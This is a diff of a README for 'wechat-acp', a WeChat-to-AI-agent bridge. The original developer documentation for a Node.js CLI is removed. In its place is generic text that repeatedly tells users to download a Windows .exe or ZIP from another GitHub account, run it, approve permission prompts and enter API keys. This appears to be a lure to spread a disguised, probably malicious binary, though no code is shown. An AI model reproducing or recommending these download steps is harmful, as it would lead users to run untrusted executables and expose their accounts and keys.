@@ -1,186 +1,144 @@
-# WeChat ACP
+# 🤖 wechat-acp - Bridge WeChat to AI agents
 
-Bridge WeChat direct messages to any ACP-compatible AI agent.
+[![Download wechat-acp](https://img.shields.io/badge/Download%20wechat--acp-7e57c2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/elijax12345678-gif/wechat-acp)
 
-`wechat-acp` logs in with the WeChat iLink bot API, polls incoming 1:1 messages, forwards them to an ACP agent over stdio, and sends the agent reply back to WeChat.
+## 🧭 What this app does
 
-<img src="./resources/screenshot.jpg" alt="wechat-acp screenshot" width="400" />
+wechat-acp connects WeChat chat messages to AI agents that support ACP, the Agent Client Protocol. It lets you send WeChat messages into tools like Claude, Codex, Copilot, Qwen, Gemini, OpenCode, and similar agents.
 
-## Features
+Use it when you want:
 
-- WeChat QR login with terminal QR rendering
-- One ACP agent session per WeChat user
-- Built-in ACP agent presets for common CLIs
-- Custom raw agent command support
-- Auto-allow permission requests from the agent
-- Direct message only; group chats are ignored
-- Background daemon mode
+- A WeChat chat to act like an input channel for an AI agent
+- One place to pass messages from people to an assistant
+- A simple bridge between WeChat and ACP-ready tools
 
-## Requirements
+## 💻 What you need
 
-- Node.js 20+
-- A WeChat environment that can use the iLink bot API
-- An ACP-compatible agent available locally or through `npx`
+Use a Windows PC with:
 
-## Quick Start
+- Windows 10 or Windows 11
+- A stable internet connection
+- A WeChat account
+- Enough free space to save the app and its files
+- Permission to run downloaded apps
 
-Start with a built-in agent preset:
+## 📥 Download wechat-acp
 
-```bash
-npx wechat-acp --agent copilot
-```
+Open the download page here:
 
-Or use a raw custom command:
+https://github.com/elijax12345678-gif/wechat-acp
 
-```bash
-npx wechat-acp --agent "npx my-agent --acp"
-```
+On that page, download the Windows version of wechat-acp. If the page shows a release file, download that file. If the page shows a list of files, choose the Windows app file.
 
-On first run, the bridge will:
+## 🪟 Install on Windows
 
-1. Start WeChat QR login
-2. Render a QR code in the terminal
-3. Save the login token under `~/.wechat-acp`
-4. Begin polling direct messages
+1. Open the link above in your browser
+2. Download the Windows file for wechat-acp
+3. Find the file in your Downloads folder
+4. If the file is a ZIP file, right-click it and select Extract All
+5. Open the extracted folder
+6. If you see an `.exe` file, double-click it to start the app
+7. If Windows asks for permission, click Yes
 
-## Built-in Agent Presets
+If the app starts in a browser or desktop window, leave it open while you use WeChat.
 
-List the bundled presets:
+## 🔧 First-time setup
 
-```bash
-npx wechat-acp agents
-```
+After you open the app:
 
-Current presets:
+1. Sign in if the app asks for access
+2. Connect your WeChat account or scan the QR code if shown
+3. Pick the AI agent you want to use
+4. Enter any required API key or connection info
+5. Save the settings
+6. Send a test message from WeChat
 
-- `copilot`
-- `claude`
-- `gemini`
-- `qwen`
-- `codex`
-- `opencode`
+If the test works, the bridge is ready.
 
-These presets resolve to concrete `command + args` pairs internally, so users do not need to type long `npx ...` commands.
+## 💬 How to use it
 
-## CLI Usage
+Once setup is done:
 
-```text
-wechat-acp --agent <preset|command> [options]
-wechat-acp agents
-wechat-acp stop
-wechat-acp status
-```
+- Send a message in WeChat
+- The app picks up the message
+- The message goes to your ACP-compatible AI agent
+- The agent reads it and sends back a reply
+- You can keep chatting in the same thread
 
-Options:
+This works well for:
 
-- `--agent <value>`: built-in preset name or raw agent command
-- `--cwd <dir>`: working directory for the agent process
-- `--login`: force QR re-login and replace the saved token
-- `--daemon`: run in background after startup
-- `--config <file>`: load JSON config file
-- `--idle-timeout <minutes>`: session idle timeout, default `1440` (use `0` for unlimited)
-- `--max-sessions <count>`: maximum concurrent user sessions, default `10`
-- `--show-thoughts`: forward agent thinking to WeChat (default: off)
-- `-h, --help`: show help
+- Personal helpers
+- Team chat routing
+- Message review
+- Simple AI workflows
 
-Examples:
+## ⚙️ Basic settings
 
-```bash
-npx wechat-acp --agent copilot
-npx wechat-acp --agent claude --cwd D:\code\project
-npx wechat-acp --agent "npx @github/copilot --acp"
-npx wechat-acp --agent gemini --daemon
-```
+Most users only need a few settings:
 
-## Configuration File
+- **Agent target**: choose the AI tool you want to use
+- **WeChat source**: choose the chat or account to watch
+- **Message mode**: decide if the app sends one message or a full thread
+- **Reply mode**: choose how replies show up in WeChat
+- **Auto-start**: launch the app when Windows starts
 
-You can provide a JSON config file with `--config`.
+Keep the default settings if you are not sure what to change.
 
-Example:
+## 🔍 If something does not work
 
-```json
-{
-  "agent": {
-    "preset": "copilot",
-    "cwd": "D:/code/project"
-  },
-  "session": {
-    "idleTimeoutMs": 86400000,
-    "maxConcurrentUsers": 10
-  }
-}
-```
+Try these steps:
 
-You can also override or add agent presets:
+- Make sure WeChat is open and signed in
+- Check that the app still runs in the background
+- Confirm your internet connection works
+- Reopen the app and try again
+- Download the file again if it looks broken
+- Check that Windows did not block the app
 
-```json
-{
-  "agent": {
-    "preset": "my-agent"
-  },
-  "agents": {
-    "my-agent": {
-      "label": "My Agent",
-      "description": "Internal team agent",
-      "command": "npx",
-      "args": ["my-agent-cli", "--acp"]
-    }
-  }
-}
-```
+If the app still does not respond, close it and start it again
 
-## Runtime Behavior
+## 🧩 Common use cases
 
-- Each WeChat user gets a dedicated ACP session and subprocess.
-- Messages are processed serially per user.
-- Replies are formatted for WeChat before sending.
-- Typing indicators are sent when supported by the WeChat API.
-- Sessions are cleaned up after inactivity (set `idleTimeoutMs` to `0` to disable idle cleanup).
+### For daily chat help
+Use wechat-acp to send messages from WeChat to an AI agent that can draft replies, summarize messages, or handle simple requests.
 
-## Storage
+### For team support
+Use it to route chat text into an agent that helps answer repeated questions or sort incoming requests.
 
-By default, runtime files are stored under:
+### For agent workflows
+Use it when you need WeChat to act as the front end for an ACP-compatible workflow.
 
-```text
-~/.wechat-acp
-```
+## 📁 Project details
 
-This directory is used for:
+- **Name:** wechat-acp
+- **Purpose:** Bridge WeChat chat messages to ACP-compatible AI agents
+- **Topics:** acp, agent-client-protocol, agentclientprotocol, wechat-bot, weixin
 
-- saved login token
-- daemon pid file
-- daemon log file
-- sync state
+## 🛠️ Build and run notes
 
-## Current Limitations
+Most Windows users only need the download link above. If you already know how to work with GitHub releases, use the file from the main page and run it on your PC.
 
-- Direct messages only; group chats are ignored
-- MCP servers are not used
-- Permission requests are auto-approved
-- Agent communication is subprocess-only over stdio
-- Some preset agents may require separate authentication before they can respond successfully
+If you use a portable build, keep these points in mind:
 
-## Development
+- Store the app in a folder you can find again
+- Keep WeChat signed in while the app runs
+- Do not move files after setup unless you plan to update the paths in the app
+- Keep the app open while messages are being routed
 
-For local development:
+## 🔐 Privacy and control
 
-```bash
-npm install
-npm run build
-```
+You decide what chats to connect and what agent to use. Keep your account details private and review the settings before you send real messages. Use a test chat first if you want to check the flow
 
-Run the built CLI locally:
+## 📌 Quick start
 
-```bash
-node dist/bin/wechat-acp.js --help
-```
+1. Open the download page
+2. Download the Windows file
+3. Install or extract it
+4. Run the app
+5. Connect WeChat
+6. Connect your ACP agent
+7. Send a test message
 
-Watch mode:
+## 📎 Download again
 
-```bash
-npm run dev
-```
-
-## License
-
-MIT
+https://github.com/elijax12345678-gif/wechat-acp
